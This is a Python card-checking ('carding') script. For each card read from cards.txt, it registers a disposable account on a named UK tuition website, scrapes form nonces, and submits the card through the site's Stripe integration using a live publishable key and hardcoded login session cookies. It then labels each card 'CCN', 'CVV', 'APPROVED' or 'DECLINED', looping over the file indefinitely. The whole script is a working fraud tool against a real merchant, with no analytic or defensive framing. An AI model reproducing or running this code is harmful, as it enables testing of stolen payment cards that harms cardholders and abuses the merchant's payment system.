import requests
import re
import random
import string
from faker import Faker
import time

def Tele_stripe5(session, cc):
    try:
        card, mm, yy, cvv = cc.split("|")
        if "20" in yy:
            yy = yy.split("20")[1]
        user_agent_func = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
        acc = ''.join(random.choices(string.ascii_lowercase, k=20)) + ''.join(random.choices(string.digits, k=4)) + "@yahoo.com"
        username = ''.join(random.choices(string.ascii_lowercase, k=20)) + ''.join(random.choices(string.digits, k=20))

        headers1 = {
            'authority': 'caretuition.co.uk',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent_func,
        }

        r1 = session.get('https://caretuition.co.uk/my-account/', headers=headers1, timeout=20)
        nonce = re.search(r'id="woocommerce-register-nonce".*?value="(.*?)"', r1.text).group(1)

        headers2 = {
            'authority': 'caretuition.co.uk',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://caretuition.co.uk',
            'pragma': 'no-cache',
            'referer': 'https://caretuition.co.uk/my-account/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent_func,
        }

        data2 = {
            'email': acc,
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': 'https://caretuition.co.uk/my-orders/payment-methods/',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://caretuition.co.uk/my-orders/add-payment-method/',
            'wc_order_attribution_session_start_time': '2024-11-26 00:40:38',
            'wc_order_attribution_session_pages': '7', # Adjusted to string
            'wc_order_attribution_session_count': '1', # Adjusted to string
            'wc_order_attribution_user_agent': user_agent_func,
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }

        r2 = session.post('https://caretuition.co.uk/my-account/', headers=headers2, data=data2, timeout=20)

        headers3 = {
            'authority': 'caretuition.co.uk',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': 'https://caretuition.co.uk/my-account/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent_func,
        }

        r3 = session.get('https://caretuition.co.uk/my-orders/payment-methods/', headers=headers3, timeout=20)

        headers4 = {
            'authority': 'caretuition.co.uk',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': 'https://caretuition.co.uk/my-orders/payment-methods/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent_func,
        }

        r4 = session.get('https://caretuition.co.uk/my-orders/add-payment-method/', headers=headers4, timeout=20)
        noncec = re.search(r'"add_card_nonce"\s*:\s*"([^"]+)"', r4.text).group(1)

        headers5 = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'pragma': 'no-cache',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user_agent_func,
        }

        data5 = f'type=card&billing_details[name]=+&billing_details[email]={acc}&card[number]={card}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid=85e7c067-688a-48ab-b60f-8df271fe5cc264a78f&muid=87271013-570f-4374-9112-cfb0861e53f8a4bd53&sid=dc07a2ea-3e9a-4cd2-955e-048c34cbca2ae662c6&payment_user_agent=stripe.js%2Fdd12309fc7%3B+stripe-js-v3%2Fdd12309fc7%3B+split-card-element&referrer=https%3A%2F%2Fcaretuition.co.uk&time_on_page=122982&key=pk_live_51KbjCnJuu9Qhmk4PaXnL2pfLANOtnAVlLiq9b4rCK0Gf79YsczSWMv3FdgOGxAMt6MyUm7fR9KSVUqY5jr24jBP100mDQDh2KQ'

        r5 = session.post('https://api.stripe.com/v1/payment_methods', headers=headers5, data=data5, timeout=20)
        if 'error' in r5.text:
            stripe_error = r5.json()['error']['message']
            if 'incorrect_cvc' in stripe_error or 'invalid_cvc' in stripe_error:
                return "CCN ✅"
            elif 'insufficient_funds' in stripe_error:
                return "CVV ✅"
            elif 'card_declined' in stripe_error:
                return "DECLINED ❌"
            elif 'expired_card' in stripe_error:
                return "EXPIRED ❌"
            else:
                return "DECLINED ❌"

        payment_method_id = r5.json()['id']

        cookies6 = {
            '_ga': 'GA1.1.1866515653.1735721986',
            'tk_or': '%22%22',
            'tk_r3d': '%22%22',
            'tk_lr': '%22%22',
            'sib_cuid': '4e145b88-b188-4037-b362-fc15f005dd70',
            '_fbp': 'fb.2.1735721986606.409518068922287335',
            '_clck': '1r0tq49%7C2%7Cfs7%7C0%7C1827',
            'wordpress_logged_in_d8152def144d384d8b804ce994375f7c': 'bakdjej737%7C1736932310%7Cb9toACCWP3Yd7DXE00JL00ooOHoRr4fHztpYs5lp0lI%7Cfb8e449ab4e4fd9f12b4a58545db5b7b4166e8302dcff3c2fa5583bc98d9447e',
            'tk_ai': '%2FbHBjK7igyBOe4L%2FZW4Rvbmw',
            '__stripe_mid': 'c25311ab-ce27-403f-aa89-860216f3daf52ba8c9',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-01-01%2010%3A23%3A53%7C%7C%7Cep%3Dhttps%3A%2F%2Fcaretuition.co.uk%2Fmy-orders%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_first_add': 'fd%3D2025-01-01%2010%3A23%3A53%7C%7C%7Cep%3Dhttps%3A%2F%2Fcaretuition.co.uk%2Fmy-orders%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
            'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fcaretuition.co.uk%2Fmy-orders%2Fadd-payment-method%2F',
            '_wpfuj': '{"1735721986":"https%3A%2F%2Fcaretuition.co.uk%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20CareTuition%7C%23%7C45249","1735723208":"https%3A%2F%2Fcaretuition.co.uk%2Fmy-orders%2Fpayment-methods%2F%7C%23%7CMy%20Orders%20-%20CareTuition%7C%23%7C31048","1735723438":"https%3A%2F%2Fcaretuition.co.uk%2Fmy-orders%2Fadd-payment-method%2F%7C%23%7CMy%20Orders%20-%20CareTuition%7C%23%7C31048","1735728834":"https%3A%F%2Fcaretuition.co.uk%2Fmy-orders%2Fpayment-methods%2F%7C%23%7CMy%20Orders%20-%20CareTuition%7C%23%7C31048","1735728837":"https%3A%2F%2Fcaretuition.co.uk%2Fmy-orders%2Fadd-payment-method%2F%7C%23%7CMy%20Orders%20-%20CareTuition%7C%23%7C31048"}',
            'tk_qs': '',
            '_ga_0QLL7WYB83': 'GS1.1.1735728833.2.1.1735728838.55.0.139782869',
            '__kla_id': 'eyJjaWQiOiJOVE16T1dGbFlXVXRZMkk1TXkwME56WmtMVGsxTnpBdE5tUXdOV1E0TldWalpEWXciLCIkZXhjaGFuZ2VfaWQiOiJHbHhSbTI5eGNXS2lTM1dOb0UzeUhUY0xPWko5cDJwSGdCdFJZckhDZWM4LlhlZ3V2aCJ9',
            '_clsk': 'lae0to%7C1735728839343%7C2%7C1%7Cx.clarity.ms%2Fcollect',
            '__stripe_sid': 'ff56065b-9735-4ba5-8f05-f7c1556dce288d5b86',
        }

        headers6 = {
            'authority': 'caretuition.co.uk',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://caretuition.co.uk',
            'pragma': 'no-cache',
            'referer': 'https://caretuition.co.uk/my-orders/add-payment-method/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user_agent_func,
            'x-requested-with': 'XMLHttpRequest',
        }

        params6 = {
            'wc-ajax': 'wc_stripe_create_setup_intent',
        }

        data6 = {
            'stripe_source_id': payment_method_id,
            'nonce': noncec,
        }

        r6 = session.post('https://caretuition.co.uk/', params=params6, cookies=cookies6, headers=headers6, data=data6, timeout=20)

        if '"success":true' in r6.text.lower():
            return "APPROVED ✅"
        elif '"success":false' in r6.text.lower():
            return "DECLINED ❌"
        elif 'error' in r6.text.lower(): # Generic error check, may need refinement
            return "DECLINED ❌" # Assuming errors are declines, adjust if needed based on response examples
        else:
            return "DECLINED ❌" # Default to declined if no clear success indicator


    except Exception as e:
        print(f"Error in Tele_stripe5 function: {e}")
        return "Error"

if __name__ == "__main__":
    while True:
        try:
            with open("cards.txt", "r") as file:
                for card_line in file:
                    cc = card_line.strip()
                    if not cc or cc.startswith('#'):
                        continue
                    session = requests.Session()
                    try:
                        result = Tele_stripe5(session, cc)
                        print(f"Card: {cc} - Result: {result}")
                    except Exception as e_card_process:
                        print(f"Error processing card {cc}: {e_card_process}")
                    time.sleep(1) # Adding a delay to be nice to the server, adjust as needed
            print("Finished checking cards from cards.txt. Restarting...")
            time.sleep(5) # Wait a bit before restarting to avoid rapid looping
        except FileNotFoundError:
            print("Error: cards.txt not found. Please create a cards.txt file with card details.")
            time.sleep(10)
        except Exception as e_file_loop:
            print(f"An error occurred in the main loop: {e_file_loop}")
            time.sleep(10)
